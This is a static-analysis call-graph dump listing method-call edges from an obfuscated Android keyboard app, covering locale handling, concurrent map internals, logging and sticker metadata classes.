CLINIT edge: staticinvoke <java.lang.System: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.lang.System: void <clinit>()>
SPECIAL edge: specialinvoke $r12.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r7) in <ivv: ivw b(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<java.util.ArrayList: void <init>()>() in <ivv: void <init>()> ==> <java.util.ArrayList: void <init>()>
VIRTUAL edge: $r6 = virtualinvoke $r7.<lsq: java.lang.String b()>() in <lsc: void f(java.lang.String,ltn)> ==> <lsp: java.lang.String b()>
INTERFACE edge: $r1 = interfaceinvoke $r2.<java.util.Set: java.lang.Object[] toArray()>() in <ljf: java.lang.Object[] toArray()> ==> <java.util.AbstractCollection: java.lang.Object[] toArray()>
STATIC edge: $z0 = staticinvoke <ivw: boolean u(char)>($c1) in <ivw: boolean F(java.lang.String)> ==> <ivw: boolean u(char)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<qj: java.lang.Object get(java.lang.Object)>($r0) in <ivw: ivw g(java.lang.String)> ==> <qj: java.lang.Object get(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractMap$SimpleImmutableEntry: boolean equals(java.lang.Object)>
INTERFACE edge: $r1 = interfaceinvoke $r0.<java.util.Set: java.util.Iterator iterator()>() in <lri: int b(java.util.Set)> ==> <lqs: java.util.Iterator iterator()>
STATIC edge: $i1 = staticinvoke <lwk: int c(java.lang.StackTraceElement[],java.lang.Class,int)>($r2, $r1, 3) in <lwk: java.lang.StackTraceElement[] b(java.lang.Class,int)> ==> <lwk: int c(java.lang.StackTraceElement[],java.lang.Class,int)>
SPECIAL edge: specialinvoke $r13.<lvq: void <init>(lvr,int)>(r0, $i1) in <lvr: void <init>(lvr,lvr)> ==> <lvq: void <init>(lvr,int)>
CLINIT edge: staticinvoke <android.view.View: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <android.view.View: void <clinit>()>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r10) in <luk: lum a(java.lang.String[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
STATIC edge: $i8 = staticinvoke <izw: int ac(int)>($i6) in <lma: lma i(int,java.lang.Object[])> ==> <izw: int ac(int)>
SPECIAL edge: specialinvoke $r3.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>("Missing subtags to form a valid language tag") in <ivv: int h()> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
STATIC edge: $z0 = staticinvoke <ivw: boolean z(java.lang.String)>($r4) in <ivw: ivw d(java.util.Locale)> ==> <ivw: boolean z(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r0.<ivw: java.lang.String p()>() in <ivw: int hashCode()> ==> <ivw: java.lang.String p()>
INTERFACE edge: $r2 = interfaceinvoke $r3.<java.util.Map: java.lang.Object put(java.lang.Object,java.lang.Object)>($r2, $r1) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <java.util.HashMap: java.lang.Object put(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $r12 = virtualinvoke $r7.<lts: java.lang.Object e(int)>($i1) in <lsd: boolean b(lsr)> ==> <lsm: java.lang.Object e(int)>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.String: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(1) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
SPECIAL edge: $r3 = specialinvoke r0.<ljf: int[] r()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: int[] r()>
SPECIAL edge: specialinvoke $r3.<lvr: void <init>(java.util.List)>($r0) in <lvt: void <clinit>()> ==> <lvr: void <init>(java.util.List)>
STATIC edge: $z0 = staticinvoke <ivw: boolean F(java.lang.String)>($r6) in <ivw: ivw d(java.util.Locale)> ==> <ivw: boolean F(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<j$.util.concurrent.ConcurrentHashMap: void <init>()>() in <iej: void <clinit>()> ==> <j$.util.concurrent.ConcurrentHashMap: void <init>()>
STATIC edge: $z0 = staticinvoke <ivw: boolean v(java.lang.String)>($r0) in <ivw: boolean F(java.lang.String)> ==> <ivw: boolean v(java.lang.String)>
SPECIAL edge: specialinvoke $r5.<java.lang.StringBuilder: void <init>()>() in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.StringBuilder: void <init>()>
INTERFACE edge: interfaceinvoke $r2.<java.util.List: void clear()>() in <ivv: ivw b(java.lang.String)> ==> <java.util.ArrayList: void clear()>
STATIC edge: $z0 = staticinvoke <java.lang.reflect.Modifier: boolean isStatic(int)>($i2) in <j$.sun.misc.b: java.lang.reflect.Field i()> ==> <java.lang.reflect.Modifier: boolean isStatic(int)>
STATIC edge: $l2 = staticinvoke <j$.util.concurrent.ThreadLocalRandom: long e(long)>($l2) in <j$.util.concurrent.ThreadLocalRandom: void c()> ==> <j$.util.concurrent.ThreadLocalRandom: long e(long)>
STATIC edge: $r1 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r1, $i0) in <ljf: java.lang.Object[] toArray()> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
VIRTUAL edge: $r26 = virtualinvoke $r25.<java.lang.Class: java.lang.reflect.Method getDeclaredMethod(java.lang.String,java.lang.Class[])>("addSuppressed", $r24) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <java.lang.Class: java.lang.reflect.Method getDeclaredMethod(java.lang.String,java.lang.Class[])>
SPECIAL edge: specialinvoke $r1.<java.lang.StringBuilder: void <init>()>() in <ojg: void v(java.lang.String)> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lta: int hashCode()> ==> <lta: int hashCode()>
STATIC edge: $r5 = staticinvoke <lma: lma i(int,java.lang.Object[])>(5, $r4) in <lma: lma v(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)> ==> <lma: lma i(int,java.lang.Object[])>
STATIC edge: $z0 = staticinvoke <java.util.Arrays: boolean equals(double[],double[])>($r16, $r17) in <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: boolean equals(double[],double[])>
VIRTUAL edge: $r12 = virtualinvoke $r11.<j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)>($r1) in <lsd: boolean b(lsr)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)>
SPECIAL edge: specialinvoke $r5.<j$.util.concurrent.p: void <init>()>() in <j$.util.concurrent.q: j$.util.concurrent.l c()> ==> <j$.util.concurrent.p: void <init>()>
VIRTUAL edge: $r3 = virtualinvoke $r1.<java.lang.String: char[] toCharArray()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.String: char[] toCharArray()>
STATIC edge: $r4 = staticinvoke <lma: lma r(java.lang.Object)>($r1) in <lma: lma i(int,java.lang.Object[])> ==> <lma: lma r(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<lsg: void <init>()>() in <lsh: void <clinit>()> ==> <lsg: void <init>()>
CLINIT edge: staticinvoke <com.google.android.apps.inputmethod.latin.LatinApp: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <com.google.android.apps.inputmethod.latin.LatinApp: void <clinit>()>
SPECIAL edge: specialinvoke $r12.<mag: void <init>(java.lang.String,int,int)>("EXPRESSIVE_STICKER_IMAGE", 12, 12) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke r0.<lsv: void <init>()>() in <lte: void <init>()> ==> <lsv: void <init>()>
STATIC edge: $r4 = staticinvoke <lqq: java.lang.Object u(java.lang.Object[],int,int,int)>($r0, $i0, $i1, 0) in <lqq: lqq r(int,java.lang.Object[],lkt)> ==> <lqq: java.lang.Object u(java.lang.Object[],int,int,int)>
STATIC edge: staticinvoke <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>($r2, "log site key") in <lta: void <init>(lsr,java.lang.Object)> ==> <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>
STATIC edge: $z0 = staticinvoke <ojg: boolean f(java.lang.Object,java.lang.Object)>($r1, $r4) in <qj: int i(java.lang.Object,int)> ==> <ojg: boolean f(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lid: java.lang.Object getValue()>() in <lid: boolean equals(java.lang.Object)> ==> <lki: java.lang.Object getValue()>
VIRTUAL edge: $z0 = virtualinvoke $r4.<nzh: boolean e()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: boolean e()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <ivv: void <init>()> ==> <java.lang.Object: void <init>()>
INTERFACE edge: $r3 = interfaceinvoke $r1.<java.util.Map$Entry: java.lang.Object getValue()>() in <lli: void c(java.util.Map$Entry)> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getValue()>
STATIC edge: $r12 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r12) in <hbw: java.lang.Object a(java.lang.Object)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke $r24.<lss: void <init>(java.lang.Throwable,ltc,java.lang.StackTraceElement[])>($r21, $r6, $r22) in <lsd: boolean b(lsr)> ==> <lss: void <init>(java.lang.Throwable,ltc,java.lang.StackTraceElement[])>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r1) in <lsc: void f(java.lang.String,ltn)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<lfb: void <init>(lfa)>($r0) in <iye: lfa p(lfa)> ==> <lfb: void <init>(lfa)>
SPECIAL edge: specialinvoke $r6.<java.lang.StringBuilder: void <init>()>() in <ivv: ivw a()> ==> <java.lang.StringBuilder: void <init>()>
SPECIAL edge: specialinvoke $r2.<hns: void <init>()>() in <hnt: void <clinit>()> ==> <hns: void <init>()>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.Enum: boolean equals(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractMap$SimpleImmutableEntry: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Enum: int ordinal()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $z0 = staticinvoke <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>($r0) in <ivw: ivw g(java.lang.String)> ==> <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>
SPECIAL edge: specialinvoke r0.<java.lang.RuntimeException: void <init>()>() in <java.lang.NullPointerException: void <init>(java.lang.String)> ==> <java.lang.RuntimeException: void <init>()>
INTERFACE edge: $r6 = interfaceinvoke $r9.<java.util.Map$Entry: java.lang.Object getKey()>() in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.k: java.lang.Object getKey()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(5) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lma: lkq f()>() in <lma: lkq k()> ==> <lqn: lkq f()>
SPECIAL edge: specialinvoke r0.<lim: void <init>()>() in <llo: void <init>(lkx,int)> ==> <lim: void <init>()>
STATIC edge: $r8 = staticinvoke <ivw: ivw d(java.util.Locale)>($r9) in <ivw: void <clinit>()> ==> <ivw: ivw d(java.util.Locale)>
CLINIT edge: staticinvoke <java.util.Locale: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.util.Locale: void <clinit>()>
STATIC edge: $z0 = staticinvoke <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>($r1) in <ivv: ivw b(java.lang.String)> ==> <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.Object: int hashCode()>() in <izw: int ad(java.lang.Object)> ==> <java.lang.String: int hashCode()>
SPECIAL edge: specialinvoke r0.<java.util.AbstractMap: void <init>()>() in <j$.util.concurrent.ConcurrentHashMap: void <init>()> ==> <java.util.AbstractMap: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <ojg: boolean f(java.lang.Object,java.lang.Object)> ==> <ivw: boolean equals(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <ivw: boolean w(char[],int,int)>($r4, $i4, $i5) in <nzh: boolean f(ivv)> ==> <ivw: boolean w(char[],int,int)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(45) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
INTERFACE edge: $r2 = interfaceinvoke $r3.<java.util.Map$Entry: java.lang.Object getKey()>() in <llg: java.lang.Object next()> ==> <lki: java.lang.Object getKey()>
SPECIAL edge: specialinvoke r0.<qj: void <init>(int)>(0) in <qj: void <init>()> ==> <qj: void <init>(int)>
STATIC edge: $i0 = staticinvoke <java.lang.Integer: int numberOfLeadingZeros(int)>($i0) in <j$.util.concurrent.ConcurrentHashMap: int n(int)> ==> <java.lang.Integer: int numberOfLeadingZeros(int)>
VIRTUAL edge: $r5 = virtualinvoke $r2.<lts: java.lang.Object d(lsz)>($r3) in <lsd: boolean b(lsr)> ==> <lsm: java.lang.Object d(lsz)>
SPECIAL edge: specialinvoke $r1.<mag: void <init>(java.lang.String,int,int)>("STICKER_JSON", 1, 1) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.String: boolean isEmpty()>() in <ivv: ivw i(java.lang.String)> ==> <java.lang.String: boolean isEmpty()>
SPECIAL edge: specialinvoke $r12.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>("Unrecognized language tag") in <ivv: ivw b(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("ExpressiveStickerMetadata", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
VIRTUAL edge: $r3 = virtualinvoke $r4.<ltc: java.lang.String toString()>() in <lss: void <init>(java.lang.Throwable,ltc,java.lang.StackTraceElement[])> ==> <java.lang.Enum: java.lang.String toString()>
VIRTUAL edge: $r6 = virtualinvoke $r7.<lsq: java.lang.String d()>() in <lsc: void f(java.lang.String,ltn)> ==> <lsp: java.lang.String d()>
SPECIAL edge: specialinvoke $r0.<java.util.concurrent.atomic.AtomicReference: void <init>()>() in <bel: void <clinit>()> ==> <java.util.concurrent.atomic.AtomicReference: void <init>()>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.AssertionError: void <init>(java.lang.Object)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractMap$SimpleImmutableEntry: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>($r1, 0, $r2, $i1, $i0) in <lql: int b(java.lang.Object[],int)> ==> <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>
SPECIAL edge: specialinvoke $r14.<java.lang.StringBuilder: void <init>()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: void <init>()>
INTERFACE edge: $r8 = interfaceinvoke $r7.<java.util.Set: java.util.Iterator iterator()>() in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.e: java.util.Iterator iterator()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lwc: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $r1 = virtualinvoke $r3.<java.lang.String: java.lang.String concat(java.lang.String)>($r1) in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
STATIC edge: staticinvoke <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>($r2, $i2, $r12) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>
SPECIAL edge: specialinvoke $r2.<mag: void <init>(java.lang.String,int,int)>("GIS_GIF_METADATA", 2, 2) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
STATIC edge: $i5 = staticinvoke <izw: int ah(int)>($i4) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <izw: int ah(int)>
STATIC edge: $r28 = staticinvoke <java.lang.Long: java.lang.Long valueOf(java.lang.String)>($r12) in <hbw: java.lang.Object a(java.lang.Object)> ==> <java.lang.Long: java.lang.Long valueOf(java.lang.String)>
VIRTUAL edge: $l1 = virtualinvoke $r3.<j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>(class "Lj$/util/concurrent/ConcurrentHashMap;", "sizeCtl") in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>
STATIC edge: $i3 = staticinvoke <izw: int ad(java.lang.Object)>($r1) in <ljf: boolean add(java.lang.Object)> ==> <izw: int ad(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r6) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<java.io.ObjectStreamField: void <init>(java.lang.String,java.lang.Class)>("rnd", $r1) in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <java.io.ObjectStreamField: void <init>(java.lang.String,java.lang.Class)>
VIRTUAL edge: $r8 = virtualinvoke $r7.<lsc: lsw d()>() in <ivw: ivw d(java.util.Locale)> ==> <lsc: lsw d()>
VIRTUAL edge: $i1 = virtualinvoke r0.<lkq: int size()>() in <lkq: lsb C(int)> ==> <lqp: int size()>
VIRTUAL edge: $i4 = virtualinvoke r0.<ljd: int e()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: int e()>
SPECIAL edge: specialinvoke $r1.<lpi: void <init>(java.lang.String,int)>("VALUE", 1) in <lpi: void <clinit>()> ==> <lpi: void <init>(java.lang.String,int)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(14) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
SPECIAL edge: $i1 = specialinvoke r0.<ivv: int h()>() in <ivv: ivw a()> ==> <ivv: int h()>
STATIC edge: $z0 = staticinvoke <ivw: boolean A(char)>($c0) in <ivw: boolean y(char)> ==> <ivw: boolean A(char)>
VIRTUAL edge: $i0 = virtualinvoke $r4.<lma: int size()>() in <lly: lma g()> ==> <lrg: int size()>
VIRTUAL edge: $i0 = virtualinvoke r0.<lvq: int b()>() in <lvq: java.lang.Object c(int)> ==> <lvq: int b()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <j$.util.concurrent.k: void <init>(java.lang.Object,java.lang.Object,j$.util.concurrent.ConcurrentHashMap)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $r0 = virtualinvoke $r2.<java.lang.Class: java.lang.reflect.Field getDeclaredField(java.lang.String)>("theUnsafe") in <j$.sun.misc.b: java.lang.reflect.Field i()> ==> <java.lang.Class: java.lang.reflect.Field getDeclaredField(java.lang.String)>
INTERFACE edge: $r2 = interfaceinvoke $r3.<java.util.Map$Entry: java.lang.Object getValue()>() in <llg: java.lang.Object next()> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getValue()>
VIRTUAL edge: $r5 = virtualinvoke $r2.<lts: java.lang.Object d(lsz)>($r3) in <lsd: boolean b(lsr)> ==> <ltr: java.lang.Object d(lsz)>
SPECIAL edge: $i2 = specialinvoke r0.<lvr: int a(java.util.Map$Entry,int,int,java.lang.Object[],int[])>($r7, $i3, $i2, $r4, $r5) in <lvr: void <init>(lvr,lvr)> ==> <lvr: int a(java.util.Map$Entry,int,int,java.lang.Object[],int[])>
INTERFACE edge: interfaceinvoke $r10.<java.util.List: boolean add(java.lang.Object)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <java.util.ArrayList: boolean add(java.lang.Object)>
STATIC edge: $r2 = staticinvoke <her: her k(miy)>($r1) in <her: void <clinit>()> ==> <her: her k(miy)>
VIRTUAL edge: $r0 = virtualinvoke $r1.<java.lang.ThreadLocal: java.lang.Object get()>() in <j$.util.concurrent.ThreadLocalRandom: int a(int)> ==> <java.lang.ThreadLocal: java.lang.Object get()>
SPECIAL edge: specialinvoke $r0.<gwk: void <init>()>() in <gwk: void <clinit>()> ==> <gwk: void <init>()>
STATIC edge: $r1 = staticinvoke <lqq: java.lang.Object u(java.lang.Object[],int,int,int)>($r0, $i2, $i0, $i1) in <lqq: java.lang.Object s(java.lang.Object[],int,int,int)> ==> <lqq: java.lang.Object u(java.lang.Object[],int,int,int)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <lvt: int hashCode()>
STATIC edge: $r4 = staticinvoke <lqq: lqq r(int,java.lang.Object[],lkt)>($i0, $r1, r0) in <lkt: lkx b(boolean)> ==> <lqq: lqq r(int,java.lang.Object[],lkt)>
SPECIAL edge: specialinvoke $r2.<java.lang.String: void <init>(char[])>($r0) in <iwt: java.lang.String e(java.lang.String)> ==> <java.lang.String: void <init>(char[])>
VIRTUAL edge: $r2 = virtualinvoke r0.<lid: java.lang.Object getValue()>() in <lid: int hashCode()> ==> <lki: java.lang.Object getValue()>
SPECIAL edge: specialinvoke $r3.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r2) in <ivv: void f(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
INTERFACE edge: $r4 = interfaceinvoke $r3.<java.util.Map$Entry: java.lang.Object getKey()>() in <lvr: int a(java.util.Map$Entry,int,int,java.lang.Object[],int[])> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getKey()>
STATIC edge: $i7 = staticinvoke <java.lang.Integer: int numberOfLeadingZeros(int)>($i0) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <java.lang.Integer: int numberOfLeadingZeros(int)>
STATIC edge: $r0 = staticinvoke <lsh: lsh j(java.lang.String)>("com/google/android/libraries/inputmethod/notificationcenter/ComponentsReadinessManager") in <iej: void <clinit>()> ==> <lsh: lsh j(java.lang.String)>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Map$Entry: java.lang.Object getKey()>() in <lli: void c(java.util.Map$Entry)> ==> <lki: java.lang.Object getKey()>
STATIC edge: staticinvoke <idq: idq a(java.lang.String,mag)>("TenorSearchSuggestionMetadata", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(", error index: ") in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
INTERFACE edge: $r9 = interfaceinvoke $r8.<java.util.Map$Entry: java.lang.Object getValue()>() in <lmb: lme f()> ==> <lki: java.lang.Object getValue()>
SPECIAL edge: specialinvoke $r3.<lsf: void <init>(lsh,java.util.logging.Level)>(r0, $r1) in <lsh: lse h(java.util.logging.Level)> ==> <lsf: void <init>(lsh,java.util.logging.Level)>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljd: java.lang.Object[] x()>() in <ljd: void t(int)> ==> <ljd: java.lang.Object[] x()>
VIRTUAL edge: $r10 = virtualinvoke $r9.<lma: lsa l()>() in <hbv: void j()> ==> <lmc: lsa l()>
CLINIT edge: staticinvoke <luk: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <luk: void <clinit>()>
STATIC edge: staticinvoke <izw: boolean D(java.util.Collection,java.util.Iterator)>($r1, $r0) in <lri: java.util.ArrayList P(java.util.Iterator)> ==> <izw: boolean D(java.util.Collection,java.util.Iterator)>
SPECIAL edge: specialinvoke $r0.<java.lang.Object: void <init>()>() in <ljd: void <clinit>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lsm: int a(lsz)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <java.lang.Object: int hashCode()>
VIRTUAL edge: $c1 = virtualinvoke $r1.<java.lang.String: char charAt(int)>($i2) in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.String: char charAt(int)>
STATIC edge: staticinvoke <izw: void an(java.lang.Object,int,int)>($r1, $i5, $i1) in <ljd: int z(int,int,int,int)> ==> <izw: void an(java.lang.Object,int,int)>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r1) in <lma: lma i(int,java.lang.Object[])> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<liz: void b()>() in <liz: java.lang.Object next()> ==> <liz: void b()>
STATIC edge: $r22 = staticinvoke <lwf: java.lang.StackTraceElement[] b(java.lang.Class,int)>(class "Llsn;", $i0) in <lsd: boolean b(lsr)> ==> <lwf: java.lang.StackTraceElement[] b(java.lang.Class,int)>
INTERFACE edge: $r7 = interfaceinvoke $r10.<java.util.Collection: java.util.Iterator iterator()>() in <lmb: lme f()> ==> <liy: java.util.Iterator iterator()>
SPECIAL edge: specialinvoke $r5.<java.lang.AssertionError: void <init>(java.lang.Object)>("Couldn\'t get the Unsafe") in <j$.sun.misc.b: void <clinit>()> ==> <java.lang.AssertionError: void <init>(java.lang.Object)>
VIRTUAL edge: $r5 = virtualinvoke $r0.<java.lang.StringBuilder: java.lang.String toString()>() in <izw: java.lang.Object al(int)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke r0.<lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)>($r1, $r2, $z0, 1) in <lsz: void <init>(java.lang.String,java.lang.Class,boolean)> ==> <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)>
VIRTUAL edge: $i0 = virtualinvoke $r2.<java.lang.String: int length()>() in <ivv: ivw a()> ==> <java.lang.String: int length()>
SPECIAL edge: specialinvoke r0.<lkg: void c(java.lang.Object)>($r1) in <lly: void j(java.lang.Object)> ==> <lkg: void c(java.lang.Object)>
STATIC edge: staticinvoke <ojg: void g(java.lang.Throwable,java.lang.String)>($r0, $r1) in <ojg: void h(java.lang.Throwable)> ==> <ojg: void g(java.lang.Throwable,java.lang.String)>
VIRTUAL edge: $r6 = virtualinvoke $r5.<java.text.SimpleDateFormat: java.lang.String format(java.util.Date)>($r3) in <lsc: void f(java.lang.String,ltn)> ==> <java.text.DateFormat: java.lang.String format(java.util.Date)>
SPECIAL edge: specialinvoke r0.<lkq: void <init>()>() in <lqp: void <init>(java.lang.Object[],int,int)> ==> <lkq: void <init>()>
STATIC edge: $r3 = staticinvoke <kes: java.lang.String k(nfe)>($r26) in <jlu: int compare(java.lang.Object,java.lang.Object)> ==> <kes: java.lang.String k(nfe)>
STATIC edge: $r0 = staticinvoke <lsh: lsh j(java.lang.String)>("com/google/android/apps/inputmethod/latin/ImeLatinApp") in <com.google.android.apps.inputmethod.latin.ImeLatinApp: void <clinit>()> ==> <lsh: lsh j(java.lang.String)>
STATIC edge: $r0 = staticinvoke <lth: lth i(java.lang.String)>("AndroidIME") in <hef: void <clinit>()> ==> <lth: lth i(java.lang.String)>
STATIC edge: $l0 = staticinvoke <lum: long b()>() in <lsn: void <init>(java.util.logging.Level)> ==> <lum: long b()>
VIRTUAL edge: $r1 = virtualinvoke $r1.<java.lang.String: java.lang.String concat(java.lang.String)>($r5) in <lvs: lvs a(java.lang.Object)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
